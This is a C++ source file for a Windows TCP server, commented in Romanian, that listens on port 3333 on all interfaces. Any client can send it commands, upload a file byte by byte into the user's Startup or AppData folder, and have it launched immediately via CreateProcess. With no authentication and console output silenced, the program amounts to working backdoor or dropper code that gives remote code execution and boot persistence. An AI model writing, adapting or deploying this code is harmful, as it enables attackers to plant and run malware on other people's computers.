#include <boost/asio.hpp>

#include <thread>
#include <atomic>
#include <memory>
#include <iostream>
# include "Status.h"
# include <fstream>
#include <shlobj.h>
#include <stdio.h>
#include <Windows.h>
using namespace boost;

Status status;
class Service
{
private:
	VOID startup(LPCTSTR lpApplicationName)
	{
		// additional information
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		// set the size of the structures
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		// start the program up
		CreateProcess(lpApplicationName,   // the path
			NULL,        // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			0,              // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi);
		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
public:
	void HandleClient(asio::ip::tcp::socket &sock,int &transfer_start,char *&filestream ,std::string path)
	{

		asio::streambuf receiver;
		asio::read_until(sock, receiver,'\n');
		std::string x;
		std::istream buf(&receiver);
		std::getline(buf, x);
		std::string response;
		char *comparer = _strdup(x.c_str());
		if (strcmp(comparer, "change path") == 0)
		{
			transfer_start = 10;
			response = "Calea curenta este catre WinDir (Default Startup)!\n";
			asio::write(sock, asio::buffer(response));
			return;
		}
		if (strcmp("Server Status",comparer)==0)
		{
			std::string aux;
			response = "Serverul este on!\n";
			asio::write(sock, asio::buffer(response));
			return;
		}
		if (strcmp("Porneste protocolul de transfer",comparer)==0)
		{
			status.x = 1;
			std::string aux;
			response = "Serverul a initiat protocolul de transfer!Waiting for input...\n";
			transfer_start = 1;
			asio::write(sock, asio::buffer(response));
			return;
		}
		if (strstr(comparer, ".") != 0)
		{
			std::ofstream file;
			file.exceptions(std::ofstream::badbit);
			try
			{
				std::ofstream g;
				g.open(comparer);
				g.close();
				if (filestream != NULL)
				{
					delete filestream;
					filestream = NULL;
				}
				std::string aux1, aux2;
				aux1 = comparer;
				aux2 = path;
				aux2 += aux1;
				filestream = _strdup(aux2.c_str());
				//std::cout << filestream << endl;
				if (strstr(comparer, "bat") != 0 || strstr(comparer, "txt"))
					transfer_start = 3;
				else
					transfer_start = 3;
				response = "fisier creat cu succes/ astept continut/n";
				asio::write(sock, asio::buffer(response));
			}
			catch (std::exception &e)
			{

			}
			//response = "Fisier identificat\n";
			////transfer_start = 1;
			//asio::write(sock, asio::buffer(response));
			return;
		}
		if (transfer_start == 2)
		{
			
			std::ofstream file;
			file.open(filestream, std::ofstream::app);
			if (strcmp(comparer, "eof") == 0)
			{
				//std::system("start a.bat");
				transfer_start = 0;
				response = "fisier trimis\n";
				asio::write(sock, asio::buffer(response));
			}
			else
			{
				file.write("\n", 1);
				file.write(comparer, strlen(comparer));
				response = "aknoleged packet\n";
				asio::write(sock, asio::buffer(response));
			}
		}
		
			if (transfer_start == 3)
			{
				//std::cout << filestream << endl;
				int nr = 0;
				std::ofstream file;
				file.open(filestream, std::ofstream::app | std::ofstream::out | std::ofstream::binary);
				if (strcmp(comparer, "eof") == 0)
				{
					file.close();
					std::string cale;
					cale = filestream;
					std::wstring steam=std::wstring(cale.begin(),cale.end());
					//std::cout << x;
					startup(steam.c_str());
					transfer_start = 0;
					response = "fisier trimis\n";
					asio::write(sock, asio::buffer(response));
				}
				else
				{
					
					char *h = strtok(comparer, "|");
					
					while (h != NULL)
					{
						nr++;
						int x = atoi(h);
						char z = x;
						file << z;
						h = strtok(NULL, "|");
					}
					response = "aknoleged packet\n";
					asio::write(sock, asio::buffer(response));
					//std::cout << nr << endl;
				}
		}
		else
		{
			std::string aux;
			response = "Serverul e inaccesibil, comenzi gresite\n";
			asio::write(sock, asio::buffer(response));
		}
	}
};

class Acceptor
{
private:
	asio::io_service &ios;
	asio::ip::tcp::acceptor acceptor;
	std::string path;
	int transfer_start = 0;
	char* file = NULL;
public:
	Acceptor(asio::io_service& io, unsigned short port_nr) :ios(io), acceptor(ios, asio::ip::tcp::endpoint(asio::ip::address_v4::any(), port_nr))
	{
		acceptor.listen();
		FindPath();
	}
	void FindPath()
	{
		TCHAR pf[MAX_PATH];
		SHGetSpecialFolderPath(
			0,
			pf,
			CSIDL_STARTUP,
			FALSE);
		wstring test(&pf[0]); 
		string test2(test.begin(), test.end()); 
		test2 += "\\";
		path = test2;
	}
	void FindPath2()
	{
		TCHAR pf[MAX_PATH];
		SHGetSpecialFolderPath(
			0,
			pf,
			CSIDL_APPDATA,
			FALSE);
		wstring test(&pf[0]);
		string test2(test.begin(), test.end());
		test2 += "\\";
		path.clear();
		//std::cout << "cale curatata" << " " << test2 << endl;
		path = test2;
	}
	void Accept()
	{
		//std::cout << path << endl;
		//std::cout << "->" << transfer_start << endl;
		asio::ip::tcp::socket sock(ios);
		if (transfer_start == 10)
		{
			//std::cout << "am intrat aici " << endl;
			transfer_start = 0;
			FindPath2();
		}
		acceptor.accept(sock);
		Service service;
		service.HandleClient(sock,transfer_start,file,path);
	}
};

class Server
{
private:
	std::unique_ptr<std::thread> exe_thread;
	std::atomic <bool> server_status;
	asio::io_service ios;
	void Run(unsigned short port_nr)
	{
		Acceptor acceptor(ios, port_nr);
		while (!server_status.load())
		{
			acceptor.Accept();
		}
	}
public:
	Server():server_status(false)
	{

	}
	void Start(unsigned short port_nr)
	{
		exe_thread.reset(new std::thread([this, port_nr]() {Run(port_nr);}));
	}
	void Stop()
	{
		server_status.store(true);
		exe_thread->join();
	}
};

void main()
{
	unsigned short port_num = 3333;
	status.x = 0;
	try {
		Server srv;
		//std::cout << "server started!" << std::endl;
		srv.Start(port_num);

		std::this_thread::sleep_for(std::chrono::seconds(1000));

		srv.Stop();
		//std::cout << "server stoped!" << std::endl;
	}
	catch (system::system_error&e) {
		std::cout << "Error occured! Error code = "
			<< e.code() << ". Message: "
			<< e.what();
	}
}